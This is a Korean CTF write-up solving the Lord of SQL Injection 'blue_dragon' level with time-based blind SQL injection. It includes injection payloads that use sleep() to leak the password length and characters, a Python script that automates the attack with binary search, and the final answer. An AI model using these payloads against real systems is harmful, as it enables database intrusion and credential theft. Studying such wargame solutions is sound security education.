---
title: LOS - 27번 blue_dragon
category: Lord of SQL Injection
---

# [27] blue_dragon

## 문제

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FKFIKw%2FbtroCv4EK0q%2F34qar1nyDQNZRXZPTiBYE0%2Fimg.png">

## 풀이

1. 싱글쿼터와 역슬래시를 필터링하고 있다.

2. pw를 알아내야하는 Blind SQLi 문제이다.

<br>

이전 문제들과 뭔가 다른 점은 다음 부분이다.

```php
$result = @mysqli_fetch_array(mysqli_query($db,$query));
if(preg_match('/\'|\\\/i', $_GET[id])) exit("No Hack ~_~");
if(preg_match('/\'|\\\/i', $_GET[pw])) exit("No Hack ~_~");
```
 
쿼리를 먼저 실행한 이후에 싱글쿼터와 역슬래시를 필터링하고 있다.

싱글쿼터나 역슬래시가 포함된 문자열을 페이로드로 전달하더라도 쿼리는 실행될 것임을 추측할 수 있다.

다만, 필터에 걸릴 시 No Hack으로 exit해주고 있기 때문에 육안으로는 쿼리의 참/거짓 결과를 알 수가 없다.

따라서 이번 문제에서는 처음으로 Time Based SQLi를 사용해보았다!

<br>

[1] pw 길이 찾기

```
?id=' || id='admin' and if(length(pw)=[숫자], sleep(3), 0) %23
```

- 뒷부분은 전부 주석으로 날려주었기 때문에 pw 페이로드는 전달할 필요가 없다.

<br> 

[2] 완전한 pw 찾기

```
?id=' || id='admin' and if(ascii(substr(pw,[인덱스],1))=[아스키], sleep(3), 0) %23
```

- 역시 pw 페이로드는 전달할 필요가 없다.

<br>

[3] 참/거짓 판별

- Request를 보낸 이후 Response가 도착하기까지 걸린 시간을 측정하여 3초가 넘으면 참으로 본다.

<br>


**LoS 27번 Python 자동화 코드**이다.
```python
import requests
import time

url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
cookie = {"PHPSESSID":"leco90m74ui20oikeo0n338f6b"}

print("🖤 Start SQLi...")

for i in range(1,100):
    payload = f"?id=' || id='admin' and if(length(pw)={i},sleep(3),0) %23"
    pre = time.time()
    requests.get(url+payload, cookies=cookie)
    post = time.time()
    if(post-pre>3):
        length = i
        print(f">> length : {length}")
        break

ans=""

for letter in range(1,length+1):
    print(f"🖤 Checking letter {letter}...")
    start = 32
    end = 127
    while True:
        middle = round((start+end)/2)
        payload = f"?id=' || id='admin' and if(ascii(substr(pw,{letter},1))>={middle},sleep(3),0) %23"
        pre = time.time()
        requests.get(url+payload, cookies=cookie)
        post = time.time()
        if(post-pre>3):
            payload = f"?id=' || id='admin' and if(ascii(substr(pw,{letter},1))={middle},sleep(3),0) %23"
            pre = time.time()
            requests.get(url+payload, cookies=cookie)
            post = time.time()
            if(post-pre>3):
                print(f">> letter {letter} → {chr(middle)}")
                ans+=chr(middle)
                break
            else:
                start = middle
        else:
            end = middle
            continue

print(f"🖤 Answer : {ans}")
```

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FeBeESw%2FbtroDPaeKTt%2FzQ2nB2e2UXsR6W4i8TLEzk%2Fimg.png">

답은 `d948b8a0` 이다.

## 결과

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F5Wdoj%2FbtroCwvIybX%2FnimHxDRsIC3HlDBClY1PN1%2Fimg.png">